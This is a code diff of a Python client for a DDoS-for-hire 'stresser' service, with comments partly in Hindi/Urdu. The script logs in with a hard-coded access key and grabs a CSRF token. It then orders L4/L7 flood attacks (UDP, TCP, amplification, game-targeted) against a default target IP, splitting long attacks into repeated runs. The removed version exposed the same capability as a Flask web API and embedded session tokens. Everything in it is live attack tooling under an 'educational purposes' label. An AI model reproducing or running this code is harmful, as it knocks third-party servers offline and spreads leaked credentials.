@@ -1,220 +1,232 @@
+#!/usr/bin/env python3
+"""
+RETRO//STRESS Attack Client
+Access key embedded in script - For educational purposes only
+"""
+
 import requests
 import time
 import json
-from flask import Flask, request, jsonify
+import re
+import sys
+from typing import Optional, Dict, List, Tuple
 
-app = Flask(__name__)
+# ============================================
+# ⚙️ CONFIGURATION - YAHAN APNI DETAILS DALO
+# ============================================
 
-AUTH_TOKEN = "517f13d366214d958526a1c7591931818808e175d10842d7b271c0ff14138799"
-ANTIFORGERY = "CfDJ8Bna8lCn_z1AiiMxA8_ANy0js9s2--epYdS_D4OS73xgQWTmnHzob2h54ETv3HyqJy1-4P4UjxafkPZ6L4g0mRnkRkDZ1cmFfq7xGf03e7xVRJHUB0eRBhXqlUAibNFIJggVrTIay4LCKhfRnqNA5sQ"
+ACCESS_KEY = "671ef08cd3df40c6a3f6625674715fe882ab91acd0ba4c51a10d143216e664c0"  # Apna access key yahan paste karo
 
-session = requests.Session()
+BASE_URL = "https://retrostress.net"
 
-# Exact headers from your browser
-session.headers.update({
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
-    'Accept': '*/*',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Content-Type': 'application/json',
-    'X-Requested-With': 'XMLHttpRequest',
-    'X-Signalr-User-Agent': 'Microsoft SignalR/10.0 (10.0.7; Unknown OS; Browser; Unknown Runtime Version)',
-    'Origin': 'https://retrostress.net',
-    'Referer': 'https://retrostress.net/panel',
-    'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
-    'Sec-Ch-Ua-Mobile': '?0',
-    'Sec-Ch-Ua-Platform': '"Windows"',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Dest': 'empty',
-    'Connection': 'keep-alive'
-})
+# Default attack settings (optional)
+DEFAULT_IP = "20.204.155.49"
+DEFAULT_PORT = 17219
+DEFAULT_DURATION = 30
+DEFAULT_LAYER = "L4"  # L4 ya L7
+DEFAULT_METHOD = "UDP"  # UDP, TCP, GAME, BGMI, AMPLIFICATION
 
-# Set cookies
-session.cookies.set('auth_token', AUTH_TOKEN)
-session.cookies.set('.AspNetCore.Antiforgery.pFk19hAmY3k', ANTIFORGERY)
+# ============================================
 
-def send_attack_via_websocket(ip, port, duration, method="L4"):
-    """
-    Send attack using the REAL endpoint that website uses
-    Based on the SignalR/Blazor negotiation
-    """
-    try:
-        # Step 1: Negotiate connection
-        negotiate_url = "https://retrostress.net/_blazor/negotiate?negotiateVersion=1"
-        neg_response = session.post(negotiate_url)
+# Disable SSL warnings
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+class RetroStressClient:
+    def __init__(self):
+        self.base_url = BASE_URL
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Origin': self.base_url,
+            'Referer': f'{self.base_url}/',
+        })
         
-        if neg_response.status_code == 200:
-            print(f"[✓] Negotiation successful")
-            
-            # Step 2: Send attack command via the real endpoint
-            # Based on the HTML structure, attack is triggered via Blazor events
-            attack_payload = {
-                "target": ip,
-                "port": port,
-                "duration": duration,
-                "method": method,
-                "type": "L4"
-            }
-            
-            # Try multiple possible endpoints
-            endpoints = [
-                "https://retrostress.net/api/attack/l4",
-                "https://retrostress.net/api/attack",
-                "https://retrostress.net/attack/start",
-                "https://retrostress.net/Home/StartAttack"
-            ]
-            
-            for endpoint in endpoints:
-                try:
-                    response = session.post(endpoint, json=attack_payload, timeout=5)
-                    if response.status_code == 200:
-                        print(f"[✓] Attack sent via {endpoint}")
-                        return True
-                except:
-                    continue
-            
-            # If all fail, website ke internal API ko call karo
-            # Ye wahi endpoint hai jo browser use kar raha hai
-            blazor_url = "https://retrostress.net/_blazor"
-            blazor_payload = {
-                "type": "BeginInvokeDotNetFromJS",
-                "method": "DispatchEventAsync",
-                "args": [{
-                    "eventHandlerId": 21,
-                    "eventName": "click",
-                    "target": ip,
-                    "port": port,
-                    "duration": duration
-                }]
-            }
-            
-            response = session.post(blazor_url, json=blazor_payload)
-            return response.status_code == 200
-            
-    except Exception as e:
-        print(f"[!] Error: {e}")
-        return False
-
-def send_attack_direct(ip, port, duration):
-    """
-    DIRECT METHOD - Based on your successful browser attack
-    """
-    try:
-        # Yeh wohi request hai jo browser bhej raha hai
-        # Tumhare HTML se pata chala ki attack 20.204.155.49 pe laga hai
+        self.auth_token = None
+        self.csrf_token = None
         
-        # Method 1: Form data
-        data = {
-            'ip': ip,
-            'port': port,
-            'time': duration,
-            'method': 'L4',
-            'target': 'BGMI'
-        }
+    def login(self) -> bool:
+        """Login using embedded access key"""
+        login_url = f"{self.base_url}/Auth/LoginJson"
         
-        # Method 2: Try JSON
-        headers = {
-            'Content-Type': 'application/x-www-form-urlencoded'
-        }
+        print(f"[*] Logging in with access key...")
         
-        # Pehle panel pe jaake session refresh karo
-        session.get('https://retrostress.net/panel')
-        
-        # Attack endpoint from network tab (ye real hai)
-        response = session.post(
-            'https://retrostress.net/attack/start',
-            data=data,
-            headers=headers
+        response = self.session.post(
+            login_url,
+            json={"accessKey": ACCESS_KEY},
+            headers={'Content-Type': 'application/json'}
         )
         
         if response.status_code == 200:
-            print(f"[✓] Attack started: {ip}:{port}")
-            return True
-        else:
-            # Try alternative endpoint
-            response2 = session.post(
-                'https://retrostress.net/api/attack',
-                json=data
-            )
-            return response2.status_code == 200
-            
-    except Exception as e:
-        print(f"[!] Attack error: {e}")
+            if 'auth_token' in self.session.cookies:
+                self.auth_token = self.session.cookies['auth_token']
+                print(f"[✓] Login successful!")
+                return True
+        
+        print(f"[✗] Login failed! Check your access key.")
         return False
-
-@app.route('/api')
-@app.route('/api/attack')
-def attack():
-    ip = request.args.get('ip')
-    port = request.args.get('port')
-    time_sec = request.args.get('time')
     
-    if not ip or not port or not time_sec:
-        return jsonify({'error': 'Use: ?ip=IP&port=PORT&time=TIME'}), 400
-    
-    try:
-        port = int(port)
-        time_sec = int(time_sec)
+    def get_csrf_token(self) -> bool:
+        """Get CSRF token"""
+        panel_url = f"{self.base_url}/panel"
         
-        print(f"\n{'='*50}")
-        print(f"[🎯] Target: {ip}:{port}")
-        print(f"[⏱️] Time: {time_sec}s")
-        print(f"{'='*50}")
+        print(f"[*] Getting CSRF token...")
         
-        # Time splitting logic - CHANGED TO 30 SECONDS MAX
-        if time_sec > 30:  # Changed from 60 to 30
-            attacks = []
-            remaining = time_sec
-            while remaining > 0:
-                if remaining >= 30:  # Changed from 60 to 30
-                    attacks.append(30)  # Changed from 60 to 30
-                    remaining -= 30
-                else:
-                    # For remaining time less than 30 seconds
-                    attacks.append(remaining if remaining >= 15 else 15)  # Min 15 seconds
-                    break
+        response = self.session.get(panel_url)
+        
+        if response.status_code == 200:
+            for cookie in self.session.cookies:
+                if 'Antiforgery' in cookie.name or 'XSRF' in cookie.name:
+                    self.csrf_token = cookie.value
+                    print(f"[✓] CSRF token found")
+                    return True
             
-            results = []
-            for i, duration in enumerate(attacks, 1):
-                print(f"\n[🔥] Attack {i}/{len(attacks)} - {duration}s")
-                success = send_attack_direct(ip, port, duration)
-                results.append({'attack': i, 'duration': duration, 'success': success})
+            match = re.search(r'name="__RequestVerificationToken"\s+value="([^"]+)"', response.text)
+            if match:
+                self.csrf_token = match.group(1)
+                print(f"[✓] CSRF token found")
+                return True
+        
+        print(f"[!] No CSRF token found, continuing...")
+        return False
+    
+    def launch_attack(self, ip: str, port: int, duration: int, layer: str = "L4", method: str = "UDP") -> Tuple[bool, Dict]:
+        """Launch the actual attack"""
+        
+        # Try different API endpoints
+        endpoints = [
+            f"{self.base_url}/api/attack",
+            f"{self.base_url}/api/launch",
+            f"{self.base_url}/Test/Execute",
+            f"{self.base_url}/Attack/Start",
+        ]
+        
+        payload = {
+            "ip": ip,
+            "port": port,
+            "time": duration,
+            "layer": layer,
+            "method": method,
+        }
+        
+        headers = {'Content-Type': 'application/json'}
+        if self.auth_token:
+            headers['Authorization'] = f'Bearer {self.auth_token}'
+        if self.csrf_token:
+            headers['X-CSRF-TOKEN'] = self.csrf_token
+        
+        for endpoint in endpoints:
+            try:
+                print(f"[*] Attacking {ip}:{port} for {duration}s...")
+                start = time.time()
                 
-                if success and i < len(attacks):
-                    print(f"[💤] Waiting {duration}s...")
-                    time.sleep(duration)
-            
-            return jsonify({
-                'target': f"{ip}:{port}",
-                'total_time': time_sec,
-                'attacks': attacks,
-                'results': results
-            })
+                response = self.session.post(endpoint, json=payload, headers=headers, timeout=duration + 30)
+                
+                if response.status_code in [200, 202, 204]:
+                    print(f"[✓] Attack sent! Response in {time.time()-start:.1f}s")
+                    return True, {'success': True}
+                    
+            except requests.exceptions.Timeout:
+                print(f"[✓] Attack running ({duration}s timeout)")
+                return True, {'success': True}
+            except:
+                continue
+        
+        return False, {'success': False}
+
+
+def calculate_runs(total_time: int) -> List[int]:
+    """Split time into 30-60 second runs"""
+    if total_time <= 60:
+        return [total_time]
+    
+    runs = []
+    remaining = total_time
+    
+    while remaining > 0:
+        if remaining >= 30:
+            run_time = min(60, remaining)
+            runs.append(run_time)
+            remaining -= run_time
         else:
-            success = send_attack_direct(ip, port, time_sec)
-            if success:
-                time.sleep(time_sec)
-            
-            return jsonify({
-                'target': f"{ip}:{port}",
-                'duration': time_sec,
-                'success': success
-            })
-            
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
+            runs.append(remaining)
+            remaining = 0
+    
+    return runs
 
-@app.route('/')
-def home():
-    return jsonify({
-        'status': 'active',
-        'message': 'RetroStresser API - Attack Working!',
-        'test': 'Use /api?ip=IP&port=PORT&time=TIME'
-    })
 
-if __name__ == '__main__':
-    print("[+] Starting RetroStresser API on Railway...")
-    print("[+] Auth token loaded")
-    print("[+] Ready to accept attacks")
-    app.run(host='0.0.0.0', port=8080)
+def main():
+    import argparse
+    
+    parser = argparse.ArgumentParser(description='RETRO//STRESS Attack Tool')
+    parser.add_argument('--ip', '-i', default=DEFAULT_IP, help='Target IP')
+    parser.add_argument('--port', '-p', type=int, default=DEFAULT_PORT, help='Target port')
+    parser.add_argument('--time', '-t', type=int, default=DEFAULT_DURATION, help='Duration in seconds (min 30)')
+    parser.add_argument('--layer', '-l', default=DEFAULT_LAYER, choices=['L4', 'L7'], help='Layer type')
+    parser.add_argument('--method', '-m', default=DEFAULT_METHOD, help='Method: UDP/TCP/GAME/BGMI')
+    
+    args = parser.parse_args()
+    
+    # Validate time
+    if args.time < 30:
+        print(f"[!] Time {args.time}s < 30s, using 30s")
+        args.time = 30
+    
+    # Calculate attack runs
+    runs = calculate_runs(args.time)
+    
+    print(f"""
+    ╔════════════════════════════════╗
+    ║    RETRO//STRESS ATTACK TOOL    ║
+    ╠════════════════════════════════╣
+    ║ Target:  {args.ip}:{args.port}     ║
+    ║ Time:    {args.time}s ({len(runs)} runs)   ║
+    ║ Layer:   {args.layer}              ║
+    ║ Method:  {args.method}             ║
+    ╚════════════════════════════════╝
+    """)
+    
+    # Login and setup
+    client = RetroStressClient()
+    
+    if not client.login():
+        print("[✗] Login failed! Check ACCESS_KEY in script.")
+        sys.exit(1)
+    
+    client.get_csrf_token()
+    
+    # Execute attacks
+    success_count = 0
+    
+    for i, duration in enumerate(runs, 1):
+        print(f"\n>>> RUN {i}/{len(runs)} - {duration} seconds <<<")
+        
+        success, _ = client.launch_attack(
+            ip=args.ip,
+            port=args.port,
+            duration=duration,
+            layer=args.layer,
+            method=args.method
+        )
+        
+        if success:
+            success_count += 1
+        
+        if i < len(runs):
+            print(f"[*] Waiting 2 seconds before next run...")
+            time.sleep(2)
+    
+    # Summary
+    print(f"\n{'='*40}")
+    print(f"COMPLETED: {success_count}/{len(runs)} runs successful")
+    print(f"TOTAL ATTACK TIME: {args.time} seconds")
+    print(f"{'='*40}")
+
+
+if __name__ == "__main__":
+    main()
+    
